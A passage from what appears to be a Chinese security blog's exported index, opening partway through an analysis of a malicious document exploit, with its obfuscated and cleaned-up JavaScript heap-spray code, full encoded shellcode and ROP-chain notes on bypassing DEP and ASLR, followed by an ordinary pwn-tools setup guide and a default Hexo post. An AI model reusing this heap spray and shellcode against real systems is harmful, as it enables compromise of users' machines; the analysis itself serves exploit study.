class="line">&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot; +</span><br><span class="line">&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot; +</span><br><span class="line">&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot; +</span><br><span class="line">&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot; +</span><br><span class="line">&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot; +</span><br><span class="line">&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot; +</span><br><span class="line">&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot; +</span><br><span class="line">&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot; +</span><br><span class="line">&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot; +</span><br><span class="line">&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot; +</span><br><span class="line">&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot; +</span><br><span class="line">&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot; +</span><br><span class="line">&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot; +</span><br><span class="line">&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot; +</span><br><span class="line">&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot; +</span><br><span class="line">&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot; +</span><br><span class="line">&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot; +</span><br><span class="line">&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot; +</span><br><span class="line">&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot; +</span><br><span class="line">&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot; +</span><br><span class="line">&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot; +</span><br><span class="line">&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot; +</span><br><span class="line">&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot; +</span><br><span class="line">&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot; +</span><br><span class="line">&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot; +</span><br><span class="line">&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot; +</span><br><span class="line">&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot; +</span><br><span class="line">&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot; +</span><br><span class="line">&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot; +</span><br><span class="line">&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot; +</span><br><span class="line">&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot; +</span><br><span class="line">&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot; +</span><br><span class="line">&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot; +</span><br><span class="line">&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot; +</span><br><span class="line">&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot; +</span><br><span class="line">&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot; +</span><br><span class="line">&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot; +</span><br><span class="line">&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot; +</span><br><span class="line">&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot; +</span><br><span class="line">&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot; +</span><br><span class="line">&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot; +</span><br><span class="line">&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot; +</span><br><span class="line">&quot;%u5fea%u5d5e%uc25b%u0008&quot;</span><br><span class="line"> );</span><br><span class="line">var pmgvXaZEVSYyZFlwiyTUXIWqxDLEEfiaxlDUvDLzHBVNwGYmidJHWcXDTBTMdsAIgkQDlyHSLn = WjOZZFaiSj(&quot;\x25\x750c0c\x25\x750c0c&quot;);</span><br><span class="line">while (pmgvXaZEVSYyZFlwiyTUXIWqxDLEEfiaxlDUvDLzHBVNwGYmidJHWcXDTBTMdsAIgkQDlyHSLn.length + 20 + 8 &lt; 65536) pmgvXaZEVSYyZFlwiyTUXIWqxDLEEfiaxlDUvDLzHBVNwGYmidJHWcXDTBTMdsAIgkQDlyHSLn+=pmgvXaZEVSYyZFlwiyTUXIWqxDLEEfiaxlDUvDLzHBVNwGYmidJHWcXDTBTMdsAIgkQDlyHSLn;</span><br><span class="line">SP = pmgvXaZEVSYyZFlwiyTUXIWqxDLEEfiaxlDUvDLzHBVNwGYmidJHWcXDTBTMdsAIgkQDlyHSLn.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">SP += nXzaRHPbywqAbGpGxOtozGkvQWhu;</span><br><span class="line">SP += pmgvXaZEVSYyZFlwiyTUXIWqxDLEEfiaxlDUvDLzHBVNwGYmidJHWcXDTBTMdsAIgkQDlyHSLn;</span><br><span class="line">xUMNQhfdmocFZymlQrTjykgzOyqFpovgWJBTEvHJesSPAVwaC = SP.substring(0, 65536/2);</span><br><span class="line">while(xUMNQhfdmocFZymlQrTjykgzOyqFpovgWJBTEvHJesSPAVwaC.length &lt; 0x80000)  //shp;aj;gfk</span><br><span class="line">xUMNQhfdmocFZymlQrTjykgzOyqFpovgWJBTEvHJesSPAVwaC += xUMNQhfdmocFZymlQrTjykgzOyqFpovgWJBTEvHJesSPAVwaC;</span><br><span class="line">//hfkahgla;jgh</span><br><span class="line">GoWTdYyXRVoaaVNQFUraIIgKaZWMCoBPCpbtBgmUEbttxdIrXcnuhbElbSzckVjaIEpsnrmaSpbURlsFTNUUnug = xUMNQhfdmocFZymlQrTjykgzOyqFpovgWJBTEvHJesSPAVwaC.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">var cDCdelAGyuQnWJRQgJYHnnYaCodcmHzSGSZCApDTmRSuzfjCcQtbDrjRWhIPALakngwCGRNLwzuwjn = new Array();</span><br><span class="line">for (DbeaIqBSxbQpCWKjOcBfxTjMMumFtvWRALLmvxWmpGqspcykSJCsnfgouxWpsMAxWGbesHwgDNlsefwq=0;DbeaIqBSxbQpCWKjOcBfxTjMMumFtvWRALLmvxWmpGqspcykSJCsnfgouxWpsMAxWGbesHwgDNlsefwq&lt;0x1f0;DbeaIqBSxbQpCWKjOcBfxTjMMumFtvWRALLmvxWmpGqspcykSJCsnfgouxWpsMAxWGbesHwgDNlsefwq++) cDCdelAGyuQnWJRQgJYHnnYaCodcmHzSGSZCApDTmRSuzfjCcQtbDrjRWhIPALakngwCGRNLwzuwjn[DbeaIqBSxbQpCWKjOcBfxTjMMumFtvWRALLmvxWmpGqspcykSJCsnfgouxWpsMAxWGbesHwgDNlsefwq]=GoWTdYyXRVoaaVNQFUraIIgKaZWMCoBPCpbtBgmUEbttxdIrXcnuhbElbSzckVjaIEpsnrmaSpbURlsFTNUUnug+&quot;s&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还原后的JS堆喷射代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var junk;</span><br><span class="line">for(i = 0; i &lt; 28002; i++)</span><br><span class="line">	junk += 0x78;</span><br><span class="line">var shellcode = unescape(&quot;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000&quot;+</span><br><span class="line">&quot;\x25\x7530e8\x25\x750000\x25\x75ad00\x25\x757d9b\x25\x75acdf\x25\x75da08\x25\x751676\x25\x75fa65&quot; +</span><br><span class="line">&quot;%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49&quot; +</span><br><span class="line">&quot;%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922&quot; +</span><br><span class="line">&quot;%u7e7c%ue2d8%u5b73%u8955%u81e5%u48ec%u0002%u8900&quot; +</span><br><span class="line">&quot;%ufc5d%u306a%u6459%u018b%u408b%u8b0c%u1c70%u8bad&quot; +</span><br><span class="line">&quot;%u0858%u0c6a%u8b59%ufc7d%u5351%u74ff%ufc8f%u8de8&quot; +</span><br><span class="line">&quot;%u0002%u5900%u4489%ufc8f%ueee2%u016a%u8d5e%uf445&quot; +</span><br><span class="line">&quot;%u5650%u078b%ud0ff%u4589%u3df0%uffff%uffff%u0475&quot; +</span><br><span class="line">&quot;%u5646%ue8eb%u003d%u0020%u7700%u4604%ueb56%u6add&quot; +</span><br><span class="line">&quot;%u6a00%u6800%u1200%u0000%u8b56%u0447%ud0ff%u006a&quot; +</span><br><span class="line">&quot;%u458d%u50ec%u086a%u458d%u50b8%u8b56%u0847%ud0ff&quot; +</span><br><span class="line">&quot;%uc085%u0475%u5646%ub4eb%u7d81%u50b8%u5064%u7444&quot; +</span><br><span class="line">&quot;%u4604%ueb56%u81a7%ubc7d%ufeef%uaeea%u0474%u5646&quot; +</span><br><span class="line">&quot;%u9aeb%u75ff%u6af0%uff40%u0c57%u4589%u85d8%u75c0&quot; +</span><br><span class="line">&quot;%ue905%u0205%u0000%u006a%u006a%u006a%uff56%u0457&quot; +</span><br><span class="line">&quot;%u006a%u458d%u50ec%u75ff%ufff0%ud875%uff56%u0857&quot; +</span><br><span class="line">&quot;%uc085%u0575%ue2e9%u0001%u5600%u57ff%u8b10%ud85d&quot; +</span><br><span class="line">&quot;%u838b%u1210%u0000%u4589%u8be8%u1483%u0012%u8900&quot; +</span><br><span class="line">&quot;%ue445%u838b%u1218%u0000%u4589%u03e0%ue445%u4503&quot; +</span><br><span class="line">&quot;%u89e8%udc45%u8a48%u0394%u121c%u0000%uc230%u9488&quot; +</span><br><span class="line">&quot;%u1c03%u0012%u8500%u77c0%u8deb%ub885%ufffe%u50ff&quot; +</span><br><span class="line">&quot;%uf868%u0000%uff00%u1457%ubb8d%u121c%u0000%uc981&quot; +</span><br><span class="line">&quot;%uffff%uffff%uc031%uaef2%ud1f7%ucf29%ufe89%uca89&quot; +</span><br><span class="line">&quot;%ubd8d%ufeb8%uffff%uc981%uffff%uffff%uaef2%u894f&quot; +</span><br><span class="line">&quot;%uf3d1%u6aa4%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc&quot; +</span><br><span class="line">&quot;%u1857%uff3d%uffff%u75ff%ue905%u014d%u0000%u4589&quot; +</span><br><span class="line">&quot;%u89c8%uffc2%ue875%u838d%u121c%u0000%u4503%u50e0&quot; +</span><br><span class="line">&quot;%ub952%u0100%u0000%u548a%ufe48%u748a%uff48%u7488&quot; +</span><br><span class="line">&quot;%ufe48%u5488%uff48%ueee2%u57ff%uff1c%uc875%u57ff&quot; +</span><br><span class="line">&quot;%u8d10%ub885%ufffe%ue8ff%u0000%u0000%u0481%u1024&quot; +</span><br><span class="line">&quot;%u0000%u6a00%u5000%u77ff%uff24%u2067%u57ff%u8924&quot; +</span><br><span class="line">&quot;%ud045%uc689%uc789%uc981%uffff%uffff%uc031%uaef2&quot; +</span><br><span class="line">&quot;%ud1f7%u8949%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f&quot; +</span><br><span class="line">&quot;%u048a%u3c0e%u7522%u491f%u048a%u3c0e%u7422%u8807&quot; +</span><br><span class="line">&quot;%u0f44%u4901%uf2eb%ucf01%uc781%u0002%u0000%u7d89&quot; +</span><br><span class="line">&quot;%ue9c0%u0013%u0000%u048a%u3c0e%u7420%u8806%u0f04&quot; +</span><br><span class="line">&quot;%ueb49%u01f3%u47cf%u7d89%uffc0%uf075%u406a%u558b&quot; +</span><br><span class="line">&quot;%ufffc%u0c52%u4589%u89d4%u8bc7%ue875%u7503%u01e0&quot; +</span><br><span class="line">&quot;%u81de%u1cc6%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc&quot; +</span><br><span class="line">&quot;%uff00%uc075%u57ff%u8918%uc445%uff3d%uffff%u74ff&quot; +</span><br><span class="line">&quot;%u576a%uc389%u75ff%ufff0%ud475%uff50%u1c57%uff53&quot; +</span><br><span class="line">&quot;%u1057%u7d8b%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae&quot; +</span><br><span class="line">&quot;%u29d1%u89cf%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d&quot; +</span><br><span class="line">&quot;%uc72e%u0447%u7865%u2065%u47c7%u2f08%u2063%u8122&quot; +</span><br><span class="line">&quot;%u0cc7%u0000%uf300%u4fa4%u07c6%u4722%u07c6%u5f00&quot; +</span><br><span class="line">&quot;\x25\x75858d\x25\x75fdb8\x25\x75ffff\x25\x7500e8\x25\x750000\x25\x758100\x25\x752404\x25\x750010&quot; +</span><br><span class="line">&quot;%u0000%u006a%uff50%u2477%u67ff%u6a20%uff00%u2c57&quot; +</span><br><span class="line">&quot;%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178&quot; +</span><br><span class="line">&quot;%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b&quot; +</span><br><span class="line">&quot;%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701&quot; +</span><br><span class="line">&quot;%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b&quot; +</span><br><span class="line">&quot;%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0&quot; +</span><br><span class="line">&quot;%u5fea%u5d5e%uc25b%u0008&quot;)</span><br><span class="line">var block = unescape(&quot;\x25\x750c0c\x25\x750c0c&quot;)</span><br><span class="line">while(block.length + 20 + 8 &lt; 65536) block += block;</span><br><span class="line">SP = block.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">SP += shellcode;</span><br><span class="line">SP += block;</span><br><span class="line">while(slackspace.length &lt; 0x80000)</span><br><span class="line">	slackspace += slackspace;</span><br><span class="line">bigblock = slackspace.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">var memory = new Array();</span><br><span class="line">for(count = 0; count &lt; 0x1f0; count++) memory[count] = bigblock + &quot;s&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>执行完<code>pop esp</code>后堆栈的情况</p>
+<img src="https://img.imgdb.cn/item/6063f1cc8322e6675c1479b9.png"  />
+
+<p>ROP指令2</p>
+<p><img src="https://img.imgdb.cn/item/6063f2278322e6675c14d95a.png"></p>
+<p>ROP指令3</p>
+<p><img src="https://img.imgdb.cn/item/6063f26a8322e6675c151f07.png"></p>
+<p>ROP指令4</p>
+<p><img src="https://img.imgdb.cn/item/6063f29e8322e6675c155dac.png"></p>
+<p>构造CreateFileA函数地址的ROP</p>
+<p><img src="https://img.imgdb.cn/item/6063f2d68322e6675c1594b3.png"></p>
+<p>CreateFileA在栈上的参数如下：</p>
+<p><img src="https://img.imgdb.cn/item/6063f3388322e6675c15fe36.png"></p>
+<p>CreateFileMapping在栈上的参数如下：</p>
+<p><img src="https://img.imgdb.cn/item/6063f4618322e6675c179120.png"></p>
+<p>MapViewOfFile在栈上的参数如下：</p>
+<p><img src="https://img.imgdb.cn/item/6063f5018322e6675c188291.png"></p>
+<p>memcpy在栈上的参数如下：</p>
+<p><img src="https://img.imgdb.cn/item/6063f62a8322e6675c19fba4.png"></p>
+<p>目的地址为MapViewOfFile的返回地址，源地址为真正的shellcode代码，将其复制到可执行可读写的区域，绕过DEP保护。由于构造的ROP均位于不受ASLR保护的icucnv36.dll，所以也可以绕过ASLR保护</p>
+]]></content>
+      <categories>
+        <category>Software</category>
+      </categories>
+      <tags>
+        <tag>Vuln</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pwn Environment</title>
+    <url>/Pwn-Environment/</url>
+    <content><![CDATA[<h1 id="1-基础环境"><a href="#1-基础环境" class="headerlink" title="1 基础环境"></a>1 基础环境</h1><p>Ubuntu版本不需要太新，版本稳定就行，遇到问题利用搜索引擎也能快速解决，推荐上手Ubuntu18，Ubuntu20实在卡顿，不敢恭维</p>
+<ul>
+<li>VMware Pro 16</li>
+<li>Ubuntu 18.04</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="2-实用软件"><a href="#2-实用软件" class="headerlink" title="2 实用软件"></a>2 实用软件</h1><h2 id="2-1-安装aptitude"><a href="#2-1-安装aptitude" class="headerlink" title="2.1 安装aptitude"></a>2.1 安装aptitude</h2><p>强大的包管理器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install aptitude</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-2-安装vim"><a href="#2-2-安装vim" class="headerlink" title="2.2 安装vim"></a>2.2 安装vim</h2><p>强大的编辑器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aptitude install vim</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-3-安装git"><a href="#2-3-安装git" class="headerlink" title="2.3 安装git"></a>2.3 安装git</h2><p>强大的github仓库管理神器</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aptitude install git</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-4-安装zsh"><a href="#2-4-安装zsh" class="headerlink" title="2.4 安装zsh"></a>2.4 安装zsh</h2><p>单纯觉得可以配置得好看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aptitude install zsh</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-5-安装terminator"><a href="#2-5-安装terminator" class="headerlink" title="2.5 安装terminator"></a>2.5 安装terminator</h2><p>gdb调试时用到，也可以选择tmux</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aptitude install terminator</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-Pwn工具"><a href="#3-Pwn工具" class="headerlink" title="3 Pwn工具"></a>3 Pwn工具</h1><h2 id="3-1-pwntools"><a href="#3-1-pwntools" class="headerlink" title="3.1 pwntools"></a>3.1 pwntools</h2><p>python2版本的pwntools：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential</span><br><span class="line"></span><br><span class="line">pip install -U setuptools</span><br><span class="line"></span><br><span class="line">pip install --upgrade pip</span><br><span class="line"></span><br><span class="line">pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
+
+<p>python3版本的pwntools：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install python3 python3-dev python3-pip git</span><br><span class="line"></span><br><span class="line">pip3 install --upgrade git+https://github.com/arthaud/python3-pwntools.git</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-2-gdb插件"><a href="#3-2-gdb插件" class="headerlink" title="3.2 gdb插件"></a>3.2 gdb插件</h2><p>原生的gdb比较难用，我们可以选择安装以下插件来进行调试</p>
+<h3 id="3-2-1-pwndbg"><a href="#3-2-1-pwndbg" class="headerlink" title="3.2.1 pwndbg"></a>3.2.1 pwndbg</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line"></span><br><span class="line">cd pwndbg</span><br><span class="line"></span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-2-peda"><a href="#3-2-2-peda" class="headerlink" title="3.2.2 peda"></a>3.2.2 peda</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git~ /peda</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-3-gef"><a href="#3-2-3-gef" class="headerlink" title="3.2.3 gef"></a>3.2.3 gef</h3><p>网上大多数使用wget的命令进行操作，但是我都无法进行下载，于是直接复制<a href="https://github.com/hugsy/gef/blob/master/gef.py">https://github.com/hugsy/gef/blob/master/gef.py</a>里面的内容，在本地新建一个gef.py的文件进行粘贴</p>
+<hr>
+<p>由于gdb一次只能使用一个插件，所以可以使用自动化脚本来进行切换。笔者插件存放目录结构如下：</p>
+<p><img src="https://img.imgdb.cn/item/604d82e95aedab222cbed9d1.png"></p>
+<p>插件配置文件<code>.gdbinit</code>(位于用户根目录下，笔者的位于<code>/home/jimp</code>目录下，没有的话可以新建一个)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source /home/jimp/safetools/peda/peda.py</span><br><span class="line">source /home/jimp/safetools/gef/gef.py			#不知道为啥这条影响其他插件的使用,故笔者本地已经删除</span><br><span class="line">source /home/jimp/safetools/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>
+
+<p><code>gdb.sh</code>文件(创建于<code>/usr/local/sbin</code>目录下)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">function Mode_change &#123;</span><br><span class="line">    name=$1</span><br><span class="line">    gdbinitfile=/home/jimp/.gdbinit    #这个路径按照你的实际情况修改</span><br><span class="line">    # gdbinitfile=/root/Desktop/mode</span><br><span class="line"> </span><br><span class="line">    peda=&quot;source /home/jimp/safetools/peda/peda.py&quot;          #这个路径按照你的实际情况修改</span><br><span class="line">    gef=&quot;source /home/jimp/safetools/gef/gef.py&quot;             #这个路径按照你的实际情况修改</span><br><span class="line">    pwndbg=&quot;source /home/jimp/safetools/pwndbg/gdbinit.py&quot;   #这个路径按照你的实际情况修改</span><br><span class="line"> </span><br><span class="line">    sign=$(cat $gdbinitfile | grep -n &quot;#this place is controled by user&#x27;s shell&quot;)    </span><br><span class="line">    #这是一个定位flag，此处上面的查找内容要和你自己的保持一致</span><br><span class="line"> </span><br><span class="line">    pattern=&quot;:#this place is controled by user&#x27;s shell&quot;</span><br><span class="line">    number=$&#123;sign%$pattern&#125;</span><br><span class="line">    location=$[number+2]</span><br><span class="line"> </span><br><span class="line">    parameter_add=$&#123;location&#125;i</span><br><span class="line">    parameter_del=$&#123;location&#125;d</span><br><span class="line"> </span><br><span class="line">    message=&quot;TEST&quot;</span><br><span class="line"> </span><br><span class="line">    if [ $name -eq &quot;1&quot; ];then</span><br><span class="line">        sed -i &quot;$parameter_del&quot; $gdbinitfile</span><br><span class="line">        sed -i &quot;$parameter_add $peda&quot; $gdbinitfile</span><br><span class="line">        echo -e &quot;Please enjoy the peda!\n&quot;</span><br><span class="line">    elif [ $name -eq &quot;2&quot; ];then</span><br><span class="line">        sed -i &quot;$parameter_del&quot; $gdbinitfile</span><br><span class="line">        sed -i &quot;$parameter_add $gef&quot; $gdbinitfile</span><br><span class="line">        echo -e &quot;Please enjoy the gef!\n&quot;</span><br><span class="line">    else</span><br><span class="line">        sed -i &quot;$parameter_del&quot; $gdbinitfile</span><br><span class="line">        sed -i &quot;$parameter_add $pwndbg&quot; $gdbinitfile</span><br><span class="line">        echo -e &quot;Please enjoy the pwndbg!\n&quot;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo -e &quot;Please choose one mode of GDB?\n1.peda    2.gef    3.pwndbg&quot;</span><br><span class="line"> </span><br><span class="line">read -p &quot;Input your choice:&quot; num</span><br><span class="line"> </span><br><span class="line">if [ $num -eq &quot;1&quot; ];then</span><br><span class="line">    Mode_change $num</span><br><span class="line">elif [ $num -eq &quot;2&quot; ];then</span><br><span class="line">    Mode_change $num</span><br><span class="line">elif [ $num -eq &quot;3&quot; ];then</span><br><span class="line">    Mode_change $num</span><br><span class="line">else</span><br><span class="line">    echo -e &quot;Error!\nPleasse input right number!&quot;</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line">gdb $1 $2 $3 $4 $5 $6 $7 $8 $9</span><br></pre></td></tr></table></figure>
+
+<p>简单使用演示：</p>
+<p><img src="https://img.imgdb.cn/item/604d8c315aedab222cc8a7cc.png"></p>
+<h2 id="3-3-32位程序支持"><a href="#3-3-32位程序支持" class="headerlink" title="3.3 32位程序支持"></a>3.3 32位程序支持</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install libc6-dev-i386</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-4-LibcSearcher"><a href="#3-4-LibcSearcher" class="headerlink" title="3.4 LibcSearcher"></a>3.4 LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line"></span><br><span class="line">git clone https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"></span><br><span class="line">cd LibcSearcher</span><br><span class="line"></span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure>
+
+<p>可以使用IZAY01师傅的LibcSearcher-ng，项目地址<a href="https://github.com/IZAY01/LibcSearcher">https://github.com/IZAY01/LibcSearcher</a>，安装方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/IZAY01/LibcSearcher.git</span><br><span class="line"></span><br><span class="line">cd LibcSearcher</span><br><span class="line"></span><br><span class="line">sudo python3 setup.py develop</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用Rootkit师傅的LibcSearcher3，项目地址<a href="https://github.com/Ro0tk1t/LibcSearcher3">https://github.com/Ro0tk1t/LibcSearcher3</a>，安装方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Ro0tk1t/LibcSearcher3.git</span><br><span class="line"></span><br><span class="line">pip3 install -e LibcSearcher3</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-5-ROPgadget"><a href="#3-5-ROPgadget" class="headerlink" title="3.5 ROPgadget"></a>3.5 ROPgadget</h2><p>用来搜索gadgets的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python-capstone</span><br><span class="line"></span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"></span><br><span class="line">cd ROPgadget </span><br><span class="line"></span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-6-one-gadget"><a href="#3-6-one-gadget" class="headerlink" title="3.6 one_gadget"></a>3.6 one_gadget</h2><p>用来搜索Rop链的工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line"></span><br><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<span id="more"></span>
+
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
